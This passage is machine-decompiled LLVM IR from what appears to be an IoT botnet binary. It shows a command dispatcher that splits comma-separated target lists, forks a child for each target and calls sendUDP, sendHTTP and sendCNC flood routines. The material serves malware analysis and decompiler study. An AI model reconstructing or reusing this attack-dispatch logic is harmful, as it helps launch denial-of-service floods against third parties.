  %v5_804fc56 = and i1 %v4_804fc56, %v3_804fc56
  br i1 %v5_804fc56, label %dec_label_pc_8050835, label %dec_label_pc_804fc5c

dec_label_pc_804fc5c:                             ; preds = %dec_label_pc_804fc3f
  %v8_804fc5c = icmp ult i32 %tmp207, 7
  store i1 %v8_804fc5c, i1* %cf.global-to-local, align 1
  %v12_804fc5c = icmp eq i32 %tmp207, 7
  %v1_804fc60 = icmp eq i1 %v12_804fc5c, false
  br i1 %v1_804fc60, label %dec_label_pc_804fc7f, label %dec_label_pc_804fc62

dec_label_pc_804fc62:                             ; preds = %dec_label_pc_804fc5c
  %v1_804fc65 = add i32 %tmp223, 24
  %v1_804fc68 = inttoptr i32 %v1_804fc65 to i32*
  %v2_804fc68 = load i32, i32* %v1_804fc68, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc68, i32* %stack_var_-476, align 4
  %v1_804fc6e = call i32 @atol(i32 %v2_804fc68)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp259 = icmp slt i32 %v1_804fc6e, 1
  %tmp260 = icmp eq i1 %tmp259, false
  br i1 %tmp260, label %dec_label_pc_804fc7f, label %dec_label_pc_8050835

dec_label_pc_804fc7f:                             ; preds = %dec_label_pc_804fc62, %dec_label_pc_804fc5c
  %v1_804fc82 = add i32 %tmp223, 4
  %v1_804fc85 = inttoptr i32 %v1_804fc82 to i32*
  %v2_804fc85 = load i32, i32* %v1_804fc85, align 4
  %v2_804fc93 = load i32, i32* %v1_804fbcf, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc93, i32* %stack_var_-476, align 4
  %v1_804fc99 = call i32 @atol(i32 %v2_804fc93)
  %v2_804fcad = load i32, i32* %v1_804fbb2, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fcad, i32* %stack_var_-476, align 4
  %v1_804fcb3 = call i32 @atol(i32 %v2_804fcad)
  %v2_804fcc4 = load i32, i32* %v1_804fbec, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fcc4, i32* %stack_var_-476, align 4
  %v1_804fcca = call i32 @atol(i32 %v2_804fcc4)
  %v2_804fcdb = load i32, i32* %v1_804fc09, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fcdb, i32* %stack_var_-476, align 4
  %v1_804fce1 = call i32 @atol(i32 %v2_804fcdb)
  store i1 %v8_804fc5c, i1* %cf.global-to-local, align 1
  br i1 %v1_804fc60, label %dec_label_pc_804fd18, label %dec_label_pc_804fcf2

dec_label_pc_804fcf2:                             ; preds = %dec_label_pc_804fc7f
  %v1_804fcf5 = add i32 %tmp223, 24
  %v1_804fcf8 = inttoptr i32 %v1_804fcf5 to i32*
  %v2_804fcf8 = load i32, i32* %v1_804fcf8, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fcf8, i32* %stack_var_-476, align 4
  %v1_804fcfe = call i32 @atol(i32 %v2_804fcf8)
  %v0_804fd03 = load i32, i32* @esp, align 4
  %v2_804fd03 = icmp ugt i32 %v0_804fd03, -17
  store i1 %v2_804fd03, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fd18

dec_label_pc_804fd18:                             ; preds = %dec_label_pc_804fc7f, %dec_label_pc_804fcf2
  %storemerge47 = phi i32 [ %v1_804fcfe, %dec_label_pc_804fcf2 ], [ 10, %dec_label_pc_804fc7f ]
  store i32 %storemerge47, i32* @esi, align 4
  %v5_804fd27 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804fd27, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc85, i32* %stack_var_-476, align 4
  %v2_804fd2d = inttoptr i32 %v2_804fc85 to i8*
  %v3_804fd2d = call i32 @__GI_strchr(i8* %v2_804fd2d, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fd35 = icmp eq i32 %v3_804fd2d, 0
  br i1 %v1_804fd35, label %dec_label_pc_804fda5, label %dec_label_pc_804fd39

dec_label_pc_804fd39:                             ; preds = %dec_label_pc_804fd18
  store i32 %v2_804fc85, i32* @eax, align 4
  store i1 %v5_804fd27, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc85, i32* %stack_var_-476, align 4
  %v2_804fd48 = call i32 @__GI_strtok(i32 %v2_804fc85, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fd9d299 = icmp eq i32 %v2_804fd48, 0
  %v1_804fda1300 = icmp eq i1 %v4_804fd9d299, false
  br i1 %v1_804fda1300, label %dec_label_pc_804fd55, label %dec_label_pc_804fddf

dec_label_pc_804fd55:                             ; preds = %dec_label_pc_804fd39, %dec_label_pc_804fd88
  %storemerge118301 = phi i32 [ %v2_804fd92, %dec_label_pc_804fd88 ], [ %v2_804fd48, %dec_label_pc_804fd39 ]
  %v0_804fd55 = call i32 @listFork()
  store i32 %v0_804fd55, i32* @eax, align 4
  %v1_804fd5a = icmp eq i32 %v0_804fd55, 0
  %v1_804fd5c = icmp eq i1 %v1_804fd5a, false
  %v0_804fd88 = load i32, i32* @esp, align 4
  %v5_804fd88 = icmp ult i32 %v0_804fd88, 8
  store i1 %v5_804fd88, i1* %cf.global-to-local, align 1
  br i1 %v1_804fd5c, label %dec_label_pc_804fd88, label %dec_label_pc_804fd5e

dec_label_pc_804fd5e:                             ; preds = %dec_label_pc_804fd55
  store i32 %v1_804fce1, i32* %stack_var_-476, align 4
  store i32 %storemerge118301, i32* %stack_var_-492, align 4
  %v6_804fd76 = call i32 @sendUDP(i32 %storemerge118301, i32 %v1_804fc99, i32 %v1_804fcb3, i32 %v1_804fcca, i32 %v1_804fce1, i32 %storemerge47)
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804fd83 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fd88:                             ; preds = %dec_label_pc_804fd55
  store i32 0, i32* %stack_var_-476, align 4
  %v2_804fd92 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fd9d = icmp eq i32 %v2_804fd92, 0
  %v1_804fda1 = icmp eq i1 %v4_804fd9d, false
  br i1 %v1_804fda1, label %dec_label_pc_804fd55, label %dec_label_pc_804fddf

dec_label_pc_804fda5:                             ; preds = %dec_label_pc_804fd18
  %v0_804fda5 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fdaa = icmp eq i32 %v0_804fda5, 0
  %v1_804fdac = icmp eq i1 %v1_804fdaa, false
  br i1 %v1_804fdac, label %dec_label_pc_8050835, label %dec_label_pc_804fdb2

dec_label_pc_804fdb2:                             ; preds = %dec_label_pc_804fda5
  %v0_804fdb2 = load i32, i32* @esp, align 4
  %v5_804fdb2 = icmp ult i32 %v0_804fdb2, 8
  store i1 %v5_804fdb2, i1* %cf.global-to-local, align 1
  store i32 %v1_804fce1, i32* %stack_var_-476, align 4
  store i32 %v2_804fc85, i32* %stack_var_-492, align 4
  %v6_804fdcd = call i32 @sendUDP(i32 %v2_804fc85, i32 %v1_804fc99, i32 %v1_804fcb3, i32 %v1_804fcca, i32 %v1_804fce1, i32 %storemerge47)
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804fdda = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fddf:                             ; preds = %dec_label_pc_804fd39, %dec_label_pc_804fd88, %dec_label_pc_804fb57
  %v2_804fde2 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804fdff = inttoptr i32 %v2_804fde2 to i8*
  store i32 %v2_804fde2, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805c8b0.884 to i32), i32* @edi, align 4
  %v7_804fe11 = call i32 @_strncmp(i8* %v4_804fdff, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805c8b0.884, i32 0, i32 0), i32 5)
  %v8_804fe11 = urem i32 %v7_804fe11, 2
  %v9_804fe11 = icmp eq i32 %v8_804fe11, 0
  %v0_804fe13 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fe13 = or i1 %v0_804fe13, %v9_804fe11
  %v3_804fe13 = zext i1 %v2_804fe13 to i32
  %v4_804fe13 = load i32, i32* @edx, align 4
  %v5_804fe13 = and i32 %v4_804fe13, -256
  %v6_804fe13 = or i32 %v3_804fe13, %v5_804fe13
  %v7_804fe13 = xor i32 %v6_804fe13, 1
  store i32 %v7_804fe13, i32* @edx, align 4
  %v3_804fe19 = and i32 %v7_804fe11, -256
  %v1_804fe1b = trunc i32 %v7_804fe13 to i8
  %v3_804fe1b = zext i1 %v0_804fe13 to i8
  %v4_804fe1b = sub nsw i8 %v1_804fe1b, %v3_804fe1b
  %v15_804fe1b = icmp eq i8 %v4_804fe1b, 0
  %v20_804fe1b = zext i8 %v4_804fe1b to i32
  %v23_804fe1b = or i32 %v20_804fe1b, %v3_804fe19
  store i32 %v23_804fe1b, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe24 = icmp eq i1 %v15_804fe1b, false
  br i1 %v1_804fe24, label %dec_label_pc_804ffab, label %dec_label_pc_804fe2a

dec_label_pc_804fe2a:                             ; preds = %dec_label_pc_804fddf
  %v2_804fe1f = sext i8 %v4_804fe1b to i32
  %v9_804fe2a = icmp ult i32 %tmp207, 5
  store i1 %v9_804fe2a, i1* %cf.global-to-local, align 1
  %v7_804fe2e = icmp sgt i32 %tmp207, 5
  br i1 %v7_804fe2e, label %dec_label_pc_804fe34, label %dec_label_pc_8050835

dec_label_pc_804fe34:                             ; preds = %dec_label_pc_804fe2a
  %v1_804fe37 = add i32 %tmp223, 4
  %v1_804fe3a = inttoptr i32 %v1_804fe37 to i32*
  %v2_804fe3a = load i32, i32* %v1_804fe3a, align 4
  %v0_804fe3c = load i32, i32* @esp, align 4
  %v5_804fe3c = icmp ult i32 %v0_804fe3c, 8
  store i1 %v5_804fe3c, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe3a, i32* %stack_var_-492, align 4
  %v2_804fe42 = inttoptr i32 %v2_804fe3a to i8*
  %v3_804fe42 = call i32 @__GI_strchr(i8* %v2_804fe42, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe4a = icmp eq i32 %v3_804fe42, 0
  br i1 %v1_804fe4a, label %dec_label_pc_804ff1f, label %dec_label_pc_804fe52

dec_label_pc_804fe52:                             ; preds = %dec_label_pc_804fe34
  %v2_804fe58 = load i32, i32* %v1_804fe3a, align 4
  store i32 %v2_804fe58, i32* @eax, align 4
  %v5_804fe5a = icmp ult i32* %stack_var_-476, inttoptr (i32 8 to i32*)
  store i1 %v5_804fe5a, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe58, i32* %stack_var_-492, align 4
  %v2_804fe63 = call i32 @__GI_strtok(i32 %v2_804fe58, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ff10297 = icmp eq i32 %v2_804fe63, 0
  %v1_804ff14298 = icmp eq i1 %v4_804ff10297, false
  br i1 %v1_804ff14298, label %dec_label_pc_804fe73, label %dec_label_pc_804ffab

dec_label_pc_804fe73:                             ; preds = %dec_label_pc_804fe52, %dec_label_pc_804fefb
  %v0_804fe73 = call i32 @listFork()
  store i32 %v0_804fe73, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe78 = icmp eq i32 %v0_804fe73, 0
  %v1_804fe7a = icmp eq i1 %v1_804fe78, false
  br i1 %v1_804fe7a, label %dec_label_pc_804fefb, label %dec_label_pc_804fe7c

dec_label_pc_804fe7c:                             ; preds = %dec_label_pc_804fe73
  %v1_804fe7f = add i32 %tmp223, 24
  %v1_804fe82 = inttoptr i32 %v1_804fe7f to i32*
  %v2_804fe82 = load i32, i32* %v1_804fe82, align 4
  %v0_804fe84 = load i32, i32* @esp, align 4
  %v5_804fe84 = icmp ult i32 %v0_804fe84, 12
  store i1 %v5_804fe84, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe82, i32* %stack_var_-492, align 4
  %v1_804fe88 = call i32 @atol(i32 %v2_804fe82)
  store i32 %v1_804fe88, i32* @ebx, align 4
  %v1_804fe95 = add i32 %tmp223, 20
  %v1_804fe98 = inttoptr i32 %v1_804fe95 to i32*
  %v2_804fe98 = load i32, i32* %v1_804fe98, align 4
  %v5_804fe9a = icmp ult i32* %stack_var_-476, inttoptr (i32 12 to i32*)
  store i1 %v5_804fe9a, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe98, i32* %stack_var_-492, align 4
  %v1_804fe9e = call i32 @atol(i32 %v2_804fe98)
  store i32 %v1_804fe9e, i32* @esi, align 4
  %v1_804feab = add i32 %tmp223, 16
  %v1_804feae = inttoptr i32 %v1_804feab to i32*
  %v2_804feae = load i32, i32* %v1_804feae, align 4
  store i32 %v2_804feae, i32* @edi, align 4
  %v1_804feb5 = add i32 %tmp223, 12
  %v1_804feb8 = inttoptr i32 %v1_804feb5 to i32*
  %v2_804feb8 = load i32, i32* %v1_804feb8, align 4
  store i1 %v5_804fe9a, i1* %cf.global-to-local, align 1
  store i32 %v2_804feb8, i32* %stack_var_-492, align 4
  %v1_804febe = call i32 @atol(i32 %v2_804feb8)
  %v1_804fed1 = add i32 %tmp223, 8
  %v1_804fed4 = inttoptr i32 %v1_804fed1 to i32*
  %v2_804fed4 = load i32, i32* %v1_804fed4, align 4
  store i32 %v2_804fed4, i32* %edx.global-to-local, align 4
  %v2_804fede = load i32, i32* %v1_804fe3a, align 4
  store i1 %v5_804fe5a, i1* %cf.global-to-local, align 1
  %v0_804fee3 = load i32, i32* @ebx, align 4
  %v0_804fee4 = load i32, i32* @esi, align 4
  store i32 %v0_804fee4, i32* %stack_var_-492, align 4
  %v0_804fee5 = load i32, i32* @edi, align 4
  store i32 %v2_804fede, i32* %stack_var_-508, align 4
  %v6_804fee9 = trunc i32 %v1_804febe to i16
  %v7_804fee9 = call i32 @sendHTTP(i32 %v2_804fede, i32 %v2_804fed4, i16 %v6_804fee9, i32 %v0_804fee5, i32 %v0_804fee4, i32 %v0_804fee3)
  store i1 %v5_804fe9a, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_804fef6 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fefb:                             ; preds = %dec_label_pc_804fe73
  %v0_804fefb = load i32, i32* @esp, align 4
  %v5_804fefb = icmp ult i32 %v0_804fefb, 8
  store i1 %v5_804fefb, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v2_804ff05 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ff10 = icmp eq i32 %v2_804ff05, 0
  %v1_804ff14 = icmp eq i1 %v4_804ff10, false
  br i1 %v1_804ff14, label %dec_label_pc_804fe73, label %dec_label_pc_804ffab

dec_label_pc_804ff1f:                             ; preds = %dec_label_pc_804fe34
  %v0_804ff1f = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff24 = icmp eq i32 %v0_804ff1f, 0
  %v1_804ff26 = icmp eq i1 %v1_804ff24, false
  br i1 %v1_804ff26, label %dec_label_pc_8050835, label %dec_label_pc_804ff2c

dec_label_pc_804ff2c:                             ; preds = %dec_label_pc_804ff1f
  %v1_804ff2f = add i32 %tmp223, 24
  %v1_804ff32 = inttoptr i32 %v1_804ff2f to i32*
  %v2_804ff32 = load i32, i32* %v1_804ff32, align 4
  %v0_804ff34 = load i32, i32* @esp, align 4
  %v5_804ff34 = icmp ult i32 %v0_804ff34, 12
  store i1 %v5_804ff34, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff32, i32* %stack_var_-492, align 4
  %v1_804ff38 = call i32 @atol(i32 %v2_804ff32)
  store i32 %v1_804ff38, i32* @ebx, align 4
  %v1_804ff45 = add i32 %tmp223, 20
  %v1_804ff48 = inttoptr i32 %v1_804ff45 to i32*
  %v2_804ff48 = load i32, i32* %v1_804ff48, align 4
  %v5_804ff4a = icmp ult i32* %stack_var_-476, inttoptr (i32 12 to i32*)
  store i1 %v5_804ff4a, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff48, i32* %stack_var_-492, align 4
  %v1_804ff4e = call i32 @atol(i32 %v2_804ff48)
  store i32 %v1_804ff4e, i32* @esi, align 4
  %v1_804ff5b = add i32 %tmp223, 16
  %v1_804ff5e = inttoptr i32 %v1_804ff5b to i32*
  %v2_804ff5e = load i32, i32* %v1_804ff5e, align 4
  store i32 %v2_804ff5e, i32* @edi, align 4
  %v1_804ff65 = add i32 %tmp223, 12
  %v1_804ff68 = inttoptr i32 %v1_804ff65 to i32*
  %v2_804ff68 = load i32, i32* %v1_804ff68, align 4
  store i1 %v5_804ff4a, i1* %cf.global-to-local, align 1
  store i32 %v2_804ff68, i32* %stack_var_-492, align 4
  %v1_804ff6e = call i32 @atol(i32 %v2_804ff68)
  %v1_804ff81 = add i32 %tmp223, 8
  %v1_804ff84 = inttoptr i32 %v1_804ff81 to i32*
  %v2_804ff84 = load i32, i32* %v1_804ff84, align 4
  store i32 %v2_804ff84, i32* %edx.global-to-local, align 4
  %v2_804ff8e = load i32, i32* %v1_804fe3a, align 4
  %v5_804ff90 = icmp ult i32* %stack_var_-476, inttoptr (i32 8 to i32*)
  store i1 %v5_804ff90, i1* %cf.global-to-local, align 1
  %v0_804ff93 = load i32, i32* @ebx, align 4
  %v0_804ff94 = load i32, i32* @esi, align 4
  store i32 %v0_804ff94, i32* %stack_var_-492, align 4
  %v0_804ff95 = load i32, i32* @edi, align 4
  store i32 %v2_804ff8e, i32* %stack_var_-508, align 4
  %v6_804ff99 = trunc i32 %v1_804ff6e to i16
  %v7_804ff99 = call i32 @sendHTTP(i32 %v2_804ff8e, i32 %v2_804ff84, i16 %v6_804ff99, i32 %v0_804ff95, i32 %v0_804ff94, i32 %v0_804ff93)
  store i1 %v5_804ff4a, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_804ffa6 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ffab:                             ; preds = %dec_label_pc_804fe52, %dec_label_pc_804fefb, %dec_label_pc_804fddf
  %v2_804ffae = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804ffcb = inttoptr i32 %v2_804ffae to i8*
  store i32 %v2_804ffae, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c8b5.885 to i32), i32* @edi, align 4
  %v7_804ffdd = call i32 @_strncmp(i8* %v4_804ffcb, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c8b5.885, i32 0, i32 0), i32 4)
  %v8_804ffdd = urem i32 %v7_804ffdd, 2
  %v9_804ffdd = icmp eq i32 %v8_804ffdd, 0
  %v0_804ffdf = load i1, i1* %cf.global-to-local, align 1
  %v2_804ffdf = or i1 %v0_804ffdf, %v9_804ffdd
  %v3_804ffdf = zext i1 %v2_804ffdf to i32
  %v4_804ffdf = load i32, i32* @edx, align 4
  %v5_804ffdf = and i32 %v4_804ffdf, -256
  %v6_804ffdf = or i32 %v3_804ffdf, %v5_804ffdf
  %v7_804ffdf = xor i32 %v6_804ffdf, 1
  store i32 %v7_804ffdf, i32* @edx, align 4
  %v1_804ffe7 = trunc i32 %v7_804ffdf to i8
  %v3_804ffe7 = zext i1 %v0_804ffdf to i8
  %v4_804ffe7 = sub nsw i8 %v1_804ffe7, %v3_804ffe7
  %v15_804ffe7 = icmp eq i8 %v4_804ffe7, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fff0 = icmp eq i1 %v15_804ffe7, false
  br i1 %v1_804fff0, label %dec_label_pc_8050120, label %dec_label_pc_804fff6

dec_label_pc_804fff6:                             ; preds = %dec_label_pc_804ffab
  %v2_804ffeb = sext i8 %v4_804ffe7 to i32
  %v9_804fff6 = icmp ult i32 %tmp207, 3
  store i1 %v9_804fff6, i1* %cf.global-to-local, align 1
  %v7_804fffa = icmp sgt i32 %tmp207, 3
  br i1 %v7_804fffa, label %dec_label_pc_8050000, label %dec_label_pc_8050835

dec_label_pc_8050000:                             ; preds = %dec_label_pc_804fff6
  %v1_8050003 = add i32 %tmp223, 8
  %v1_8050006 = inttoptr i32 %v1_8050003 to i32*
  %v2_8050006 = load i32, i32* %v1_8050006, align 4
  %v0_8050008 = load i32, i32* @esp, align 4
  %v5_8050008 = icmp ult i32 %v0_8050008, 12
  store i1 %v5_8050008, i1* %cf.global-to-local, align 1
  %v1_805000c = call i32 @atol(i32 %v2_8050006)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp261 = icmp slt i32 %v1_805000c, 1
  br i1 %tmp261, label %dec_label_pc_8050835, label %dec_label_pc_805001c

dec_label_pc_805001c:                             ; preds = %dec_label_pc_8050000
  %v1_805001f = add i32 %tmp223, 12
  %v1_8050022 = inttoptr i32 %v1_805001f to i32*
  %v2_8050022 = load i32, i32* %v1_8050022, align 4
  %v5_8050024 = icmp ult i32* %stack_var_-508, inttoptr (i32 12 to i32*)
  store i1 %v5_8050024, i1* %cf.global-to-local, align 1
  %v1_8050028 = call i32 @atol(i32 %v2_8050022)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp262 = icmp slt i32 %v1_8050028, 1
  %tmp263 = icmp eq i1 %tmp262, false
  br i1 %tmp263, label %dec_label_pc_8050039, label %dec_label_pc_8050835

dec_label_pc_8050039:                             ; preds = %dec_label_pc_805001c
  %v1_805003c = add i32 %tmp223, 4
  %v1_805003f = inttoptr i32 %v1_805003c to i32*
  %v2_805003f = load i32, i32* %v1_805003f, align 4
  %v2_805004a = load i32, i32* %v1_8050006, align 4
  store i1 %v5_8050024, i1* %cf.global-to-local, align 1
  %v1_8050050 = call i32 @atol(i32 %v2_805004a)
  %v2_8050061 = load i32, i32* %v1_8050022, align 4
  store i1 %v5_8050024, i1* %cf.global-to-local, align 1
  %v1_8050067 = call i32 @atol(i32 %v2_8050061)
  %v5_8050075 = icmp ult i32* %stack_var_-508, inttoptr (i32 8 to i32*)
  store i1 %v5_8050075, i1* %cf.global-to-local, align 1
  %v2_805007b = inttoptr i32 %v2_805003f to i8*
  %v3_805007b = call i32 @__GI_strchr(i8* %v2_805007b, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050083 = icmp eq i32 %v3_805007b, 0
  br i1 %v1_8050083, label %dec_label_pc_80500f5, label %dec_label_pc_8050087

dec_label_pc_8050087:                             ; preds = %dec_label_pc_8050039
  store i32 %v2_805003f, i32* @eax, align 4
  store i1 %v5_8050075, i1* %cf.global-to-local, align 1
  %v2_8050093 = call i32 @__GI_strtok(i32 %v2_805003f, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80500ed294 = icmp eq i32 %v2_8050093, 0
  %v1_80500f1295 = icmp eq i1 %v4_80500ed294, false
  br i1 %v1_80500f1295, label %dec_label_pc_80500a0, label %dec_label_pc_8050120

dec_label_pc_80500a0:                             ; preds = %dec_label_pc_8050087, %dec_label_pc_80500d8
  %storemerge44296 = phi i32 [ %v2_80500e2, %dec_label_pc_80500d8 ], [ %v2_8050093, %dec_label_pc_8050087 ]
  %v0_80500a0 = call i32 @listFork()
  store i32 %v0_80500a0, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80500a5 = icmp eq i32 %v0_80500a0, 0
  %v1_80500a7 = icmp eq i1 %v1_80500a5, false
  %v0_80500d8 = load i32, i32* @esp, align 4
  br i1 %v1_80500a7, label %dec_label_pc_80500d8, label %dec_label_pc_80500a9

dec_label_pc_80500a9:                             ; preds = %dec_label_pc_80500a0
  %v5_80500a9 = icmp ult i32 %v0_80500d8, 4
  store i1 %v5_80500a9, i1* %cf.global-to-local, align 1
  %v3_80500b5 = call i32 @sendCNC(i32 %storemerge44296, i32 %v1_8050050, i32 %v1_8050067)
  %v0_80500bd = load i32, i32* @global_var_805f8c0.20, align 64
  store i1 %v5_8050024, i1* %cf.global-to-local, align 1
  %v1_80500c6 = call i32 @__libc_close(i32 %v0_80500bd)
  store i1 %v5_8050024, i1* %cf.global-to-local, align 1
  %v1_80500d3 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80500d8:                             ; preds = %dec_label_pc_80500a0
  %v5_80500d8 = icmp ult i32 %v0_80500d8, 8
  store i1 %v5_80500d8, i1* %cf.global-to-local, align 1
  %v2_80500e2 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80500ed = icmp eq i32 %v2_80500e2, 0
  %v1_80500f1 = icmp eq i1 %v4_80500ed, false
  br i1 %v1_80500f1, label %dec_label_pc_80500a0, label %dec_label_pc_8050120

dec_label_pc_80500f5:                             ; preds = %dec_label_pc_8050039
  %v0_80500f5 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80500fa = icmp eq i32 %v0_80500f5, 0
  %v1_80500fc = icmp eq i1 %v1_80500fa, false
  br i1 %v1_80500fc, label %dec_label_pc_8050835, label %dec_label_pc_8050102

dec_label_pc_8050102:                             ; preds = %dec_label_pc_80500f5
  %v0_8050102 = load i32, i32* @esp, align 4
  %v5_8050102 = icmp ult i32 %v0_8050102, 4
  store i1 %v5_8050102, i1* %cf.global-to-local, align 1
  %v3_805010e = call i32 @sendCNC(i32 %v2_805003f, i32 %v1_8050050, i32 %v1_8050067)
  store i1 %v5_8050024, i1* %cf.global-to-local, align 1
  %v1_805011b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050120:                             ; preds = %dec_label_pc_8050087, %dec_label_pc_80500d8, %dec_label_pc_804ffab
  %v2_8050123 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_8050140 = inttoptr i32 %v2_8050123 to i8*
  store i32 %v2_8050123, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805c8b9.886 to i32), i32* @edi, align 4
  %v7_8050152 = call i32 @_strncmp(i8* %v4_8050140, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805c8b9.886, i32 0, i32 0), i32 6)
  %v8_8050152 = urem i32 %v7_8050152, 2
  %v9_8050152 = icmp eq i32 %v8_8050152, 0
  %v0_8050154 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050154 = or i1 %v0_8050154, %v9_8050152
  %v3_8050154 = zext i1 %v2_8050154 to i32
  %v4_8050154 = load i32, i32* @edx, align 4
  %v5_8050154 = and i32 %v4_8050154, -256
  %v6_8050154 = or i32 %v3_8050154, %v5_8050154
  %v7_8050154 = xor i32 %v6_8050154, 1
  store i32 %v7_8050154, i32* @edx, align 4
  %v1_805015c = trunc i32 %v7_8050154 to i8
  %v3_805015c = zext i1 %v0_8050154 to i8
  %v4_805015c = sub nsw i8 %v1_805015c, %v3_805015c
  %v15_805015c = icmp eq i8 %v4_805015c, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050165 = icmp eq i1 %v15_805015c, false
  br i1 %v1_8050165, label %dec_label_pc_80502e9, label %dec_label_pc_805016b

dec_label_pc_805016b:                             ; preds = %dec_label_pc_8050120
  %v2_8050160 = sext i8 %v4_805015c to i32
  %v9_805016b = icmp ult i32 %tmp207, 3
  store i1 %v9_805016b, i1* %cf.global-to-local, align 1
  %v7_805016f = icmp sgt i32 %tmp207, 3
  br i1 %v7_805016f, label %dec_label_pc_8050175, label %dec_label_pc_8050835

dec_label_pc_8050175:                             ; preds = %dec_label_pc_805016b
  %v1_8050178 = add i32 %tmp223, 8
  %v1_805017b = inttoptr i32 %v1_8050178 to i32*
  %v2_805017b = load i32, i32* %v1_805017b, align 4
  %v0_805017d = load i32, i32* @esp, align 4
  %v5_805017d = icmp ult i32 %v0_805017d, 12
  store i1 %v5_805017d, i1* %cf.global-to-local, align 1
  store i32 %v2_805017b, i32* %stack_var_-476, align 4
  %v1_8050181 = call i32 @atol(i32 %v2_805017b)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp264 = icmp slt i32 %v1_8050181, 1
  br i1 %tmp264, label %dec_label_pc_8050835, label %dec_label_pc_8050191

dec_label_pc_8050191:                             ; preds = %dec_label_pc_8050175
  %v1_8050194 = add i32 %tmp223, 12
  %v1_8050197 = inttoptr i32 %v1_8050194 to i32*
  %v2_8050197 = load i32, i32* %v1_8050197, align 4
  %v5_8050199 = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_8050199, i1* %cf.global-to-local, align 1
  store i32 %v2_8050197, i32* %stack_var_-476, align 4
  %v1_805019d = call i32 @atol(i32 %v2_8050197)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp265 = icmp slt i32 %v1_805019d, 1
  %tmp266 = icmp eq i1 %tmp265, false
  br i1 %tmp266, label %dec_label_pc_80501ae, label %dec_label_pc_8050835

dec_label_pc_80501ae:                             ; preds = %dec_label_pc_8050191
  %v1_80501b1 = add i32 %tmp223, 4
  %v1_80501b4 = inttoptr i32 %v1_80501b1 to i32*
  %v2_80501b4 = load i32, i32* %v1_80501b4, align 4
  %v2_80501bf = load i32, i32* %v1_805017b, align 4
